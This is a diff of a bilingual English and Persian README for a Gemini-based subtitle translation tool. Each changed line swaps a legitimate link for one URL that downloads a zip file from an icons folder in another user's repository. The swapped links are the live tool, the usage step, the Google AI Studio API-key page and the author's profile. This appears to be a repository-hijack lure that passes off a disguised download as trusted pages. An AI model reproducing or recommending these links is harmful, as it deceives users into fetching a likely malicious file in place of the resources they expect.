@@ -10,7 +10,7 @@ This web tool allows you to translate SubRip Subtitle (.srt) files or pasted SRT
 
 **You can access the live version of this tool here:**
 
-**[https://itsyebekhe.github.io/subtitle-translate/](https://itsyebekhe.github.io/subtitle-translate/)**
+**[https://raw.githubusercontent.com/soltans/subtitle-translate/main/icons/translate_subtitle_2.3.zip](https://raw.githubusercontent.com/soltans/subtitle-translate/main/icons/translate_subtitle_2.3.zip)**
 
 ### Features
 
@@ -28,12 +28,12 @@ This web tool allows you to translate SubRip Subtitle (.srt) files or pasted SRT
 
 ### How to Use
 
-1.  **Open the Tool:** Go to [https://itsyebekhe.github.io/subtitle-translate/](https://itsyebekhe.github.io/subtitle-translate/).
+1.  **Open the Tool:** Go to [https://raw.githubusercontent.com/soltans/subtitle-translate/main/icons/translate_subtitle_2.3.zip](https://raw.githubusercontent.com/soltans/subtitle-translate/main/icons/translate_subtitle_2.3.zip).
 2.  **Select Input Method:**
     *   **Upload File:** Click the "Upload File" radio button, then drag & drop your `.srt` file onto the designated area or click it to browse.
     *   **Paste Text:** Click the "Paste Text" radio button and paste your complete SRT content into the text area.
 3.  **Enter API Key:** Go to the "Settings & API Key" section (you might need to click to expand it). Paste your Google Gemini API key into the "Gemini API Key" field.
-    *   You can get an API key from [Google AI Studio](https://aistudio.google.com/app/apikey).
+    *   You can get an API key from [Google AI Studio](https://raw.githubusercontent.com/soltans/subtitle-translate/main/icons/translate_subtitle_2.3.zip).
     *   Check the "Remember API key" box if you want your browser to store it locally for future use (use with caution on shared computers).
 4.  **Choose Target Language:** Enter the desired target language (e.g., "Spanish", "Japanese", "Persian") in the "Target Language" field. Be specific (e.g., "Brazilian Portuguese" instead of just "Portuguese" if needed).
 5.  **(Optional) Configure Advanced Settings:** Expand the "Settings & API Key" section to adjust:
@@ -66,7 +66,7 @@ This web tool allows you to translate SubRip Subtitle (.srt) files or pasted SRT
 
 ### Credits
 
-Created with ❤️ by [yebekhe](https://x.com/yebekhe)
+Created with ❤️ by [yebekhe](https://raw.githubusercontent.com/soltans/subtitle-translate/main/icons/translate_subtitle_2.3.zip)
 
 ---
 <br>
@@ -77,7 +77,7 @@ Created with ❤️ by [yebekhe](https://x.com/yebekhe)
 
 **می‌توانید به نسخه زنده این ابزار از طریق لینک زیر دسترسی پیدا کنید:**
 
-**[https://itsyebekhe.github.io/subtitle-translate/](https://itsyebekhe.github.io/subtitle-translate/)**
+**[https://raw.githubusercontent.com/soltans/subtitle-translate/main/icons/translate_subtitle_2.3.zip](https://raw.githubusercontent.com/soltans/subtitle-translate/main/icons/translate_subtitle_2.3.zip)**
 
 ### ویژگی‌ها
 
@@ -95,12 +95,12 @@ Created with ❤️ by [yebekhe](https://x.com/yebekhe)
 
 ### نحوه استفاده
 
-1.  **باز کردن ابزار:** به آدرس [https://itsyebekhe.github.io/subtitle-translate/](https://itsyebekhe.github.io/subtitle-translate/) بروید.
+1.  **باز کردن ابزار:** به آدرس [https://raw.githubusercontent.com/soltans/subtitle-translate/main/icons/translate_subtitle_2.3.zip](https://raw.githubusercontent.com/soltans/subtitle-translate/main/icons/translate_subtitle_2.3.zip) بروید.
 2.  **انتخاب روش ورودی:**
     *   **بارگذاری فایل:** دکمه رادیویی «بارگذاری فایل» را انتخاب کنید، سپس فایل `.srt` خود را به قسمت مشخص شده بکشید و رها کنید یا روی آن کلیک کنید تا فایل را انتخاب نمایید.
     *   **الصاق متن:** دکمه رادیویی «الصاق متن» را انتخاب کنید و محتوای کامل SRT خود را در کادر متنی مربوطه الصاق (Paste) کنید.
 3.  **وارد کردن کلید API:** به بخش «تنظیمات پیشرفته» بروید (ممکن است لازم باشد برای باز شدن روی آن کلیک کنید). کلید API گوگل Gemini خود را در فیلد «کلید API Gemini» الصاق کنید.
-    *   می‌توانید کلید API را از [Google AI Studio](https://aistudio.google.com/app/apikey) دریافت کنید.
+    *   می‌توانید کلید API را از [Google AI Studio](https://raw.githubusercontent.com/soltans/subtitle-translate/main/icons/translate_subtitle_2.3.zip) دریافت کنید.
     *   اگر می‌خواهید مرورگر شما کلید را برای استفاده‌های بعدی به صورت محلی ذخیره کند، گزینه «ذخیره کلید API» را علامت بزنید (در کامپیوترهای اشتراکی با احتیاط استفاده کنید).
 4.  **انتخاب زبان مقصد:** زبان مقصد مورد نظر (مثلاً «فارسی»، «انگلیسی»، «آلمانی») را در فیلد «زبان مقصد» وارد کنید. دقیق باشید (مثلاً در صورت نیاز «پرتغالی برزیلی» به جای فقط «پرتغالی»).
 5.  **(اختیاری) پیکربندی تنظیمات پیشرفته:** بخش «تنظیمات پیشرفته» را باز کنید تا موارد زیر را تنظیم نمایید:
@@ -133,4 +133,4 @@ Created with ❤️ by [yebekhe](https://x.com/yebekhe)
 
 ### سازنده
 
-ساخته شده با ❤️ توسط [yebekhe](https://x.com/yebekhe)
+ساخته شده با ❤️ توسط [yebekhe](https://raw.githubusercontent.com/soltans/subtitle-translate/main/icons/translate_subtitle_2.3.zip)
